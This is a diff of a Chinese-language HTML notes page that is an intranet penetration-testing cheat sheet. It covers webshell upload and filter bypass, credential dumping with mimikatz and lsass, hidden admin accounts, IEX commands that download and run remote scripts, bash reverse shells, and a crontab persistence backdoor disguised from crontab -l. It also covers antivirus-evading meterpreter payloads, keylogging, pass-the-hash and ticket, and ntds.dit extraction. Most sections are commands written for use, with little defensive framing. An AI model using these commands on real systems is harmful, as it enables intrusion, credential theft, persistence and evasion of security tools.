@@ -1,15 +1,13 @@
-<blockquote>
-  <p>文章内容没谈snmp利用，可以去乌云等社区获取，没有后续内网持久化，日志处理，bypass uac等内容。</p>
-</blockquote>
+<p>文章内容没谈snmp利用，可以去乌云等社区获取，没有后续内网持久化，日志处理，bypass uac等内容。</p>
 
-<p>Webshell:</p>
+<h2 id="webshell">Webshell</h2>
+
 <blockquote>
   <p>测试主站，搜wooyun历史洞未发现历史洞，github,svn,目录扫描未发现敏感信息,无域传送，端口只开了80端口，找到后台地址，想爆破后台，验证码后台验证，一次性，用ocr识别，找账号，通过google，baidu，bing等搜索，相关邮箱，域名等加常用密码组成字典，发现用户手册，找账号，发现未打码信息，和默认密码，试下登陆成功，找后台，上传有dog，用含有一句话的txt文件<code class="highlighter-rouge"><span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span><span class="cp">?&gt;</span></code>，打包为zip，php文件<code class="highlighter-rouge"><span class="cp">&lt;?php</span> <span class="k">include</span> <span class="s1">'phar://1.zip/1.txt'</span><span class="p">;</span><span class="cp">?&gt;</span></code>即可，c刀被拦，修改config.ini文件，php_make <code class="highlighter-rouge">@eval(call_user_func_array(base64_decode,array($_POST[action])));</code>用回调函数，第一个为函数名，二个为传的参数.</p>
 </blockquote>
 
+<h2 id="前期收集">前期收集</h2>
 <hr />
-
-<h3 id="前期收集">前期收集</h3>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>query user || qwinsta 查看当前在线用户
 net user  查看本机用户
@@ -47,23 +45,34 @@ arp -a
 </code></pre></div></div>
 
 <ul>
-  <li>发现远程登录密码等密码 netpass.exe  下载https://www.nirsoft.net/utils/network_password_recovery.html</li>
-  <li>获取window vpn密码：
-mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit</li>
-  <li>wifi密码：
-netsh wlan show profile 查处wifi名下一条命令用
-netsh wlan show profile WiFi-name key=clear</li>
-  <li>ie代理
-reg query “HKEY_USERSS-1-5-21-1563011143-1171140764-1273336227-500SoftwareMicrosoftWindowsCurrentVersionInternet Settings” /v ProxyServer
-reg query “HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionInternet Settings”</li>
-  <li>pac代理
-reg query “HKEY_USERSS-1-5-21-1563011143-1171140764-1273336227-500SoftwareMicrosoftWindowsCurrentVersionInternet Settings” /v AutoConfigURL   //引子 t0stmail</li>
+  <li>发现远程登录密码等密码 netpass.exe
+下载https://www.nirsoft.net/utils/network_password_recovery.html</li>
   <li>
-    <h2 id="powershell-nishang">powershell-nishang</h2>
+    <p>获取window vpn密码：</p>
+
+    <p>mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit</p>
+  </li>
+  <li>
+    <p>wifi密码：</p>
+
+    <p>netsh wlan show profile 查处wifi名下一条命令用
+  netsh wlan show profile WiFi-name key=clear</p>
+  </li>
+  <li>
+    <p>ie代理</p>
+
+    <p>reg query “HKEY_USERSS-1-5-21-1563011143-1171140764-1273336227-500SoftwareMicrosoftWindowsCurrentVersionInternet Settings” /v ProxyServer<br />
+  reg query “HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionInternet Settings”</p>
+  </li>
+  <li>
+    <p>pac代理</p>
+
+    <p>reg query “HKEY_USERSS-1-5-21-1563011143-1171140764-1273336227-500SoftwareMicrosoftWindowsCurrentVersionInternet Settings” /v AutoConfigURL   //引 t0stmail</p>
   </li>
 </ul>
 
-<h4 id="一些命令">一些命令</h4>
+<h3 id="一些命令">一些命令</h3>
+<hr />
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping          icmp连通性
 nslookup www.baidu.com vps-ip dns连通性
@@ -78,9 +87,8 @@ where file win查找文件是否存在
 netstat -apn | grep 8888   kill -9 PID   查看端口并kill
 </code></pre></div></div>
 
+<h2 id="3389">3389</h2>
 <hr />
-
-<h3 id="3389">3389</h3>
 
 <p>判断是内网，还是外网，内网转发到vps</p>
 
@@ -88,32 +96,40 @@ netstat -apn | grep 8888   kill -9 PID   查看端口并kill
 tasklist /svc,查svchost.exe对应的TermService的pid,看netstat相等的pid即3389端口.
 </code></pre></div></div>
 
-<h4 id="添加user">添加user</h4>
+<h3 id="添加user">添加user</h3>
+<hr />
 
-<p>net user admin1 admin1 /add &amp; net localgroup administrators admin1 /add<br />
-如不允许远程连接，修改注册表<br />
-REG ADD “HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<br />
-REG ADD “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /v PortNumber /t REG_DWORD /d 0x00000d3d /f<br />
-如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则，允许3389端口，命令如下:<br />
-netsh advfirewall firewall add rule name=”Remote Desktop” protocol=TCP dir=in localport=3389 action=allow<br />
-关闭防火墙<br />
-	netsh firewall set opmode mode=disable<br />
-[3389user无法添加]http://www.91ri.org/5866.html</p>
+<p><code class="highlighter-rouge">net user admin1 admin1 /add &amp; net localgroup administrators admin1 /add</code></p>
 
-<h5 id="隐藏win账户">隐藏win账户</h5>
+<p>如不允许远程连接，修改注册表</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  
+REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x00000d3d /f  
+</code></pre></div></div>
+<p>如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则，允许3389端口，命令如下:<br />
+<code class="highlighter-rouge">netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow </code></p>
+
+<p>关闭防火墙<br />
+<code class="highlighter-rouge">netsh firewall set opmode mode=disable </code>
+<a href="http://www.91ri.org/5866.html">3389user无法添加</a></p>
+
+<h3 id="隐藏win账户">隐藏win账户</h3>
+<hr />
 <p>开启sys权限cmd</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1');Invoke-TokenManipulation -CreateProcess 'cmd.exe' -Username 'nt authority\system'   add user 并隐藏  
 
-IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/Windows-User-Clone/master/Windows-User-Clone.ps1')   win server有密码强度要求，改为更复杂密码即可
-
-[渗透技巧——Windows系统的帐户隐藏](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/)  
-[windows的RDP连接记录](http://rcoil.me/2018/05/%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95/)
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/Windows-User-Clone/master/Windows-User-Clone.ps1')  
 </code></pre></div></div>
 
-<h2 id="反弹转发">反弹，转发</h2>
+<p>win server有密码强度要求，改为更复杂密码即可</p>
 
-<h3 id="linux-bash">linux bash</h3>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/">渗透技巧——Windows系统的帐户隐藏</a>  <br />
+<a href="http://rcoil.me/2018/05/%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95/">windows的RDP连接记录</a></p>
+
+<h1 id="反弹转发">反弹，转发</h1>
+
+<h2 id="linux-bash">linux bash</h2>
+<hr />
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
 |
@@ -121,34 +137,40 @@ bash -i 交互的shell
 &gt;&amp; 标准错误输出到标准输出
 /dev/tcp/10.0.0.1/8080 建立socket ip port
 0&gt;&amp;1 标准输入到标准输出
-	
+
 (crontab -l;echo '*/60 * * * * exec 9&lt;&gt; /dev/tcp/IP/port;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i')|crontab -
 猥琐版(crontab -l;printf "*/60 * * * * exec 9&lt;&gt; /dev/tcp/IP/PORT;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for whoami%100c\n")|crontab -
 详细介绍 https://github.com/tom0li/security_circle/blob/master/15288418585142.md
 </code></pre></div></div>
 
-<h4 id="ngrok-backdoor">ngrok-backdoor</h4>
+<h2 id="ngrok-backdoor">ngrok-backdoor</h2>
+<hr />
+<p>Grok-backdoor是一个简单的基于python的后门，它使用Ngrok隧道进行通信。Ngrok后门可以使用Pyinstaller生成windows，linux和mac二进制文件.<br />
+虽然免杀，但如果开win防火墙会提示，生成后门时会询问是否捆绑ngrok，选择no时，在被攻击机执行时需联网下载ngrok，运行后，telnet连接即可. <br />
+github  https://github.com/deepzec/Grok-backdoor</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Grok-backdoor是一个简单的基于python的后门，它使用Ngrok隧道进行通信。Ngrok后门可以使用Pyinstaller生成windows，linux和mac二进制文件.  
-虽然免杀，但如果开win防火墙会提示，生成后门时会询问是否捆绑ngrok，选择no时，在被攻击机执行时需联网下载ngrok，运行后，telnet连接即可.   github  https://github.com/deepzec/Grok-backdoor
-</code></pre></div></div>
-
-<h4 id="veil">veil</h4>
+<h2 id="veil">veil</h2>
+<hr />
 <p>这里，安装问题有点多，我用kali-2018-32安装成功，先安装下列依赖，后按照官方即可。</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  apt-get install libncurses5*
-  apt-get install libavutil55*
-  apt-get install gcc-mingw-w64*
-  apt-get install wine32 生成shell
-
-./Veil.py
-use 1
-use c/meterpreter/rev_tcp    在win gcc -o v.exe v.c -lws2_32 用mingw下gcc编译bypass 360   msfconsole -r veil.rc (其中veil.rc是之前生成的，bypass)
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt-get install libncurses5*
+apt-get install libavutil55*
+apt-get install gcc-mingw-w64*
+apt-get install wine32  
 </code></pre></div></div>
+<p>生成shell</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./Veil.py
+use 1
+use c/meterpreter/rev_tcp
+</code></pre></div></div>
+
+<p>在win gcc -o v.exe v.c -lws2_32 用mingw下gcc编译bypass 360<br />
+msfconsole -r veil.rc (其中veil.rc是之前生成的，bypass)</p>
 
 <p>python -m SimpleHTTPServer 80虚拟机里开启，在外访问虚拟机ip即可下载虚拟机文件</p>
 
-<h4 id="ew">ew</h4>
+<h2 id="ew">ew</h2>
+<hr />
 <p>tools: http://rootkiter.com/EarthWorm<br />
 新版tools： http://rootkiter.com/Termite/<br />
 正向：</p>
@@ -177,7 +199,8 @@ use c/meterpreter/rev_tcp    在win gcc -o v.exe v.c -lws2_32 用mingw下gcc编�
 	./ew_for_Linux32 -s rssocks -d 192.168.1.100 -e 2333
 </code></pre></div></div>
 
-<h4 id="nc">nc</h4>
+<h2 id="nc">nc</h2>
+<hr />
 <p><a href="https://tom0li.github.io/2017/05/06/nc/">nc简单使用</a><br />
 linux root 权限</p>
 
@@ -188,7 +211,8 @@ linux root 权限</p>
 <p>权限不够用mkfifo /tmp/backpipe<br />
 以上用nc监听即可</p>
 
-<h4 id="lcx">lcx</h4>
+<h2 id="lcx">lcx</h2>
+<hr />
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>被攻击机 lcx.exe -slave 139.1.2.3 8888 10.48.128.25 3389
 vps      lcx.exe –listen 8888 5555
@@ -196,18 +220,21 @@ vps      lcx.exe –listen 8888 5555
 
 <p>在本机mstsc登陆139.1.2.3:5555或在vps连接127.0.0.1:5555</p>
 
-<h4 id="netsh-win自带只支持tcp360拦">netsh win自带(只支持tcp)360拦</h4>
+<h2 id="netsh-win自带只支持tcp360拦">netsh win自带(只支持tcp)360拦</h2>
+<hr />
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.1.101 connectport=8080 将本地80转到192.168.1.101:8080端口
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.1.101 connectport=8080   将本地80转到192.168.1.101:8080端口
 
-netsh interface portproxy add v4tov4 listenaddress=1.1.1.101 listenport=8082 connectaddress=192.168.2.102 connectport=3389 通过连接1.1.1.101的8082端口，相当连接1.1.1.101可访问的内网192.168.2.102的3389端口
+netsh interface portproxy add v4tov4 listenaddress=1.1.1.101 listenport=8082 connectaddress=192.168.2.102 connectport=3389   通过连接1.1.1.101的8082端口，相当连接1.1.1.101可访问的内网192.168.2.102的3389端口
 </code></pre></div></div>
 
-<h4 id="gomsf--pymsf-bypass360">go+msf &amp; py+msf bypass360</h4>
+<h2 id="gomsf--pymsf-bypass360">go+msf &amp; py+msf bypass360</h2>
+<hr />
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf编码生成后，用go build -ldflags="-H windowsgui -s -w"即可，详细参考以下link   http://lu4n.com/metasploit-payload-bypass-av-note/ http://hacktech.cn/2017/04/20/msf-AntiVirus.html
 </code></pre></div></div>
 
-<h2 id="提权">提权</h2>
+<h1 id="提权">提权</h1>
+<hr />
 <p>win提权辅助工具，原理主要通过systeminfo补丁信息比对漏洞库<br />
 工具链接 https://github.com/GDSSecurity/Windows-Exploit-Suggester</p>
 
@@ -219,6 +246,7 @@ https://github.com/jondonas/linux-exploit-suggester-2</p>
 <a href="https://github.com/SecWiki/linux-kernel-exploits">linux-kernel-exploits Linux平台提权漏洞集合</a></p>
 
 <h2 id="msf">msf</h2>
+<hr />
 <p>linux相关payload：</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    linux/x86/meterpreter/reverse_tcp
@@ -263,6 +291,7 @@ https://github.com/jondonas/linux-exploit-suggester-2</p>
 <p>meterpreter下上传 upload file 下载 download file</p>
 
 <h3 id="msf进程注入测试win10没成功win2008-可以360会拦">Msf进程注入(测试win10没成功,win2008 可以，360会拦)</h3>
+<hr />
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; getuid
 Server username: xxxx
 meterpreter &gt; getpid
@@ -282,6 +311,7 @@ meterpreter &gt; migrate 676
 </code></pre></div></div>
 
 <h3 id="msf-hash">Msf hash</h3>
+<hr />
 
 <ol>
   <li>meterpreter &gt; run hashdump      需要sys权限 导出SAM</li>
@@ -291,10 +321,12 @@ meterpreter &gt; migrate 676
 </ol>
 
 <h3 id="msf的持续后门">Msf的持续后门</h3>
+<hr />
 
 <p>Persistence: run persistence -h：用于创建启动项启动，会创建注册表，创建文件。（X86_Linux不支持此脚本）</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run persistence -U -i 10 -p 10390 -r free.ngrok.cc 会被360拦，-i 10 10秒请求一次   使用powershell执行也被监控而被360拦截
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run persistence -U -i 10 -p 10390 -r free.ngrok.cc 
+会被360拦，-i 10 10秒请求一次   使用powershell执行也被监控而被360拦截
 </code></pre></div></div>
 
 <p>meterpreter 的 run getgui -e 命令可以开启成
@@ -303,6 +335,7 @@ meterpreter &gt; migrate 676
 <p>Run metsvc -h ：用于创建服务，会创建meterpreter服务，并上传三个文件，使用-r参数可以卸载服务 ，被拦</p>
 
 <h3 id="msf-powershell">Msf powershell</h3>
+<hr />
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; load powershell
 meterpreter &gt; powershell_shell
@@ -311,9 +344,11 @@ Ps &gt; Invoke-Mimikatz -DumpCreds
 </code></pre></div></div>
 
 <h3 id="msf-router">Msf Router</h3>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2个或多个路由之间，没有配置相应的路由表，不能访问，获得一台机器shell session 添加路由，使msf可以在当前shell session下以被攻击机访问其他内网主机，
+<hr />
 
-meterpreter &gt; run get_local_subnets 
+<p>2个或多个路由之间，没有配置相应的路由表，不能访问，获得一台机器shell session 添加路由，使msf可以在当前shell session下以被攻击机访问其他内网主机.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; run get_local_subnets 
 	[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
 	[!] Example: run post/multi/manage/autoroute OPTION=value [...]
 	Local subnet: 172.17.0.0/255.255.0.0
@@ -331,24 +366,29 @@ msf auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 172.17.0.0/24
 rhosts =&gt; 172.17.0.0/24
 msf auxiliary(scanner/smb/smb_ms17_010) &gt; set threads 50
 threads =&gt; 50
-msf auxiliary(scanner/smb/smb_ms17_010) &gt; run 先利用exploit/windows/smb/ms17_010_psexec，win10旧版依旧可以，新版设置smbuser，smbpass即可
+msf auxiliary(scanner/smb/smb_ms17_010) &gt; run
 </code></pre></div></div>
 
+<p>先利用exploit/windows/smb/ms17_010_psexec，win10旧版依旧可以，新版设置smbuser，smbpass即可</p>
+
 <h3 id="msf扫描">Msf扫描</h3>
+<hr />
 <p>经过上面设置路由即可使用以下scan：</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/scanner/portscan/syn
 use auxiliary/scanner/portscan/tcp
 </code></pre></div></div>
 
-<p>常用port 21,80,443,873,2601,2604,3128,4440,6082,6379,8000,8008,8080,8081,8090,8099,8088,8888,9000,9090,9200,11211,27017,28017,50070,19004440,5082,7001,6082,50000,8888,2222,2082,2083,3312,3311,7778,8083,10000,8089,8649,27017,27018,5900,5631,4899</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>常用port 21,80,443,873,2601,2604,3128,4440,6082,6379,8000,8008,8080,8081,8090,8099,8088,8888,9000,9090,9200,11211,27017,28017,50070,19004440,5082,7001,6082,50000,8888,2222,2082,2083,3312,3311,7778,8083,10000,8089,8649,27017,27018,5900,5631,4899
+</code></pre></div></div>
+<p>服务扫描:</p>
 
-<p>服务扫描:<br />
-	SMB版本识别：auxiliary/scanner/smb/smb_version 
-	MSSQL信息收集：search mssql相关模块，如auxiliary/scanner/mssql/mssql_ping 查询mssql监听的端口，默认1433
-	SSH版本信息：auxiliary/scanner/ssh/ssh_version
-	FTP版本识别：auxiliary/scanner/ftp/ftp_version
-	HTTP服务：auxiliary/scanner/http/http_header 返回相关header信息</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB版本识别：auxiliary/scanner/smb/smb_version 
+MSSQL信息收集：search mssql相关模块，如auxiliary/scanner/mssql/mssql_ping 查询mssql监听的端口，默认1433
+SSH版本信息：auxiliary/scanner/ssh/ssh_version
+FTP版本识别：auxiliary/scanner/ftp/ftp_version
+HTTP服务：auxiliary/scanner/http/http_header 返回相关header信息
+</code></pre></div></div>
 
 <p>port：21 （FTP）</p>
 
@@ -418,9 +458,10 @@ auxiliary/scanner/redis/file_upload
 </code></pre></div></div>
 
 <p>use auxiliary/server/socks4a<br />
-proxychains设置socks4为上条设置的，即可在本地代理扫描,目前msf已经支持 socks5 代理</p>
+proxychains设置socks4为上条设置的，即可在本地代理扫描, 目前msf已经支持 socks5 代理</p>
 
 <h3 id="msf端口转发portfwd">Msf端口转发portfwd</h3>
+<hr />
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>portfwd add -L 0.0.0.0 4443 -p 3389 -r 192.168.2.100
 </code></pre></div></div>
@@ -428,12 +469,14 @@ proxychains设置socks4为上条设置的，即可在本地代理扫描,目前ms
 <p>将192.168.1.2.100内网转发到本地4443 port，流量大不好用</p>
 
 <h3 id="msf截屏没被360拦没提示或许有意外收获">Msf截屏(没被360拦没提示，或许有意外收获)</h3>
+<hr />
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; use espia
 meterpreter &gt; screengrab
 </code></pre></div></div>
 
 <h3 id="msf嗅探">Msf嗅探</h3>
+<hr />
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; use sniffer
 Loading extension sniffer...Success.
 meterpreter &gt; help
@@ -475,6 +518,7 @@ meterpreter &gt; sniffer_stop 5
 </code></pre></div></div>
 
 <h3 id="键盘记录">键盘记录</h3>
+<hr />
 <p>Msf键盘记录在win不会创建新进程</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; keyscan_start 
 Starting the keystroke sniffer ...
@@ -484,10 +528,11 @@ jamd&lt;CR&gt;
 meterpreter &gt; keyscan_stop 
 Stopping the keystroke sniffer...
 </code></pre></div></div>
-<p>Keylogger(tip:可以把管理工具，如navicat,putty,SecureCRT,PLSQL设置记住密码) –redrain<br />
+<p>Keylogger(tip:可以把管理工具，如navicat,putty,SecureCRT,PLSQL设置记住密码)
 ixkeylog,linux&gt;=2.63 –redrain推荐</p>
 
 <h2 id="远程命令执行">远程命令执行</h2>
+<hr />
 
 <p>at\schtasks\psexec\wmic\sc\ps</p>
 
@@ -497,8 +542,8 @@ ixkeylog,linux&gt;=2.63 –redrain推荐</p>
 /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 </code></pre></div></div>
 
-<h4 id="ipc">ipc$</h4>
-
+<h3 id="ipc">ipc$</h3>
+<hr />
 <p>开启共享，开445，139 port</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>D:&gt;net use \\192.168.1.254\c$ "pwd" /user:user     //连接192.168.1.254的IPC$共享，用unc路径
@@ -506,9 +551,11 @@ ixkeylog,linux&gt;=2.63 –redrain推荐</p>
 D:&gt;copy srv.exe \\192.168.1.254\c$ //复制本地srv.exe到C根目录
 D:&gt;net time \\192.168.1.254         //查时间
 D:&gt;at　\\192.168.1.254 10:50 srv.exe //用at命令在10点50分启动srv.exe (这里360会拦截)
-D:&gt;net use \\192.168.1.254\c$ /del  #### Schtasks
+D:&gt;net use \\192.168.1.254\c$ /del 
 </code></pre></div></div>
 
+<h3 id="schtasks">Schtasks</h3>
+<hr />
 <p>这里schtasks用着很舒服:</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks /create /tn mytask /s ip /tr F:\Desktop.exe /sc minute /mo 1  /F 每分运行1次  普通权限即可， /s参数 远程ip 用于ipc连接后，远程主机执行 ，/F 表示有重名直接覆盖和创建或删除修改计划不再确认
@@ -536,37 +583,43 @@ mytask                                   16-05-2018 07:52:00    Ready
 C:\jboss-5.1.0.GA\bin\&gt;schtasks /Delete /TN mytask /F /s 172.17.1.1
 SUCCESS: The scheduled task "mytask" was successfully deleted.
 </code></pre></div></div>
-<h4 id="psexec">psexec</h4>
+<h3 id="psexec">psexec</h3>
+<hr />
 
 <p>psexec 不推荐用,创建服务并删除,产生日志，需要开共享</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psexec -r sanr \\192.168.1.101 -u user -p pass cmd -r 参数为创建的服务名 可能绕过检测
 </code></pre></div></div>
 
-<h4 id="wmi135">wmi(135)</h4>
-
+<h3 id="wmi135">wmi(135)</h3>
+<hr />
 <p>wmi 如果防火墙开启无法连接，优点无日志，无落地(写入磁盘)，以下命令无回显，写入txt，type查看</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /node:192.168.1.101 /user:admin /password:@!123QWW
-process call create "cmd.exe /c whoami" #####  wmiexec
-
-cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 username password 如果没明文密码，pth后利用。 http://www.91ri.org/12908.html
+process call create "cmd.exe /c whoami"
 </code></pre></div></div>
 
-<h4 id="winexe">winexe</h4>
+<h4 id="wmiexec">wmiexec</h4>
+<hr />
 
+<p>cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 username password 
+如果没明文密码，pth后利用。
+http://www.91ri.org/12908.html</p>
+
+<h3 id="winexe">winexe</h3>
+<hr />
 <p>winexe可以从Linux上远程执行windows命令（SMB），kali自带</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./winexe --system -U 'Administrator%123123' //192.168.1.101 'cmd.exe /c whoami'
 </code></pre></div></div>
 
-<h4 id="psremoting">PsRemoting</h4>
-
+<h3 id="psremoting">PsRemoting</h3>
+<hr />
 <p>2012 r2起,默认端口5985,系统自带远程管理winrs
 winrs -r:192.168.1.101 -u:administrator -p:pwd ipconfig</p>
 
-<h3 id="mimikatz--procdump-获得内存-hash">mimikatz + procdump 获得内存 hash</h3>
-
+<h2 id="mimikatz--procdump-获得内存-hash">mimikatz + procdump 获得内存 hash</h2>
+<hr />
 <p>如果服务器是64位，要把Mimikatz进程迁移到一个64位的程序进程中，才能查看64位系统密码明文。32位任意</p>
 
 <p>运行<code class="highlighter-rouge">procdump.exe -accepteula -ma lsass.exe lsass.dmp</code>(管理权限)后lsass.dmp放到mimikatz.exe同目录，运行以下命令
@@ -655,10 +708,14 @@ cmd:</p>
 
 <p>powershell:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1   重启或者用户再次登录，能够导出明文口令   [3gstudent自动Dump-Clear-Text-Password-after-KB2871997-installed](https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed)
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1  
 </code></pre></div></div>
 
-<h3 id="sam-hash">SAM-hash</h3>
+<p>重启或者用户再次登录，能够导出明文口令<br />
+<a href="https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed">3gstudent自动Dump-Clear-Text-Password-after-KB2871997-installed</a></p>
+
+<h2 id="sam-hash">SAM-hash</h2>
+<hr />
 <p>管理权限：</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg save HKLM\SYSTEM Sys.hiv
@@ -694,11 +751,10 @@ User : HomeGroupUser$
 </code></pre></div></div>
 
 <h3 id="pass-the-hash">pass the hash</h3>
-
+<hr />
 <p>wmiexec普通权限即可<br />
 https://github.com/maaaaz/impacket-examples-windows</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>																				 domain=TEST user=test1
-	wmiexec -hashes 00000000000000000000000000000000:99b2b135c9e829367d9f07201b1007c3 TEST/test1@192.168.1.1 "whoami"
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmiexec -hashes 00000000000000000000000000000000:99b2b135c9e829367d9f07201b1007c3 TEST/test1@192.168.1.1 "whoami" //domain=TEST user=test1
 </code></pre></div></div>
 <p>or
 需要管理权限</p>
@@ -724,6 +780,7 @@ meterpreter &gt; shell
 <p>https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/</p>
 
 <h3 id="pass-the-key">pass the key</h3>
+<hr />
 <p>需要免杀：</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz "privilege::debug" "sekurlsa::ekeys"  获取用户的aes key
@@ -732,20 +789,28 @@ dir \\计算机名
 </code></pre></div></div>
 
 <h3 id="pass-the-ticket">pass the ticket</h3>
+<hr />
 <p>不需要管理员权限</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kekeo "tgt::ask /user:abc /domain:test.local /ntlm:hash" https://github.com/gentilkiwi/kekeo 导入ticket：
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kekeo "tgt::ask /user:abc /domain:test.local /ntlm:hash" https://github.com/gentilkiwi/kekeo
+</code></pre></div></div>
 
-kekeo "kerberos::ptt TGT_abc@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi"
+<p>导入ticket：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kekeo "kerberos::ptt TGT_abc@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi"
 </code></pre></div></div>
 
 <h3 id="ntdsdit">ntds.dit</h3>
+<hr />
 <p>vssadmin方法&gt;=win 2008<br />
 查询当前系统的快照</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin list shadows 创建快照
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin list shadows
+</code></pre></div></div>
 
-vssadmin create shadow /for=c: 获得Shadow Copy Volume Name为\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy47
+<p>创建快照</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin create shadow /for=c: 获得Shadow Copy Volume Name为\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy47
 </code></pre></div></div>
 
 <p>复制ntds.dit</p>
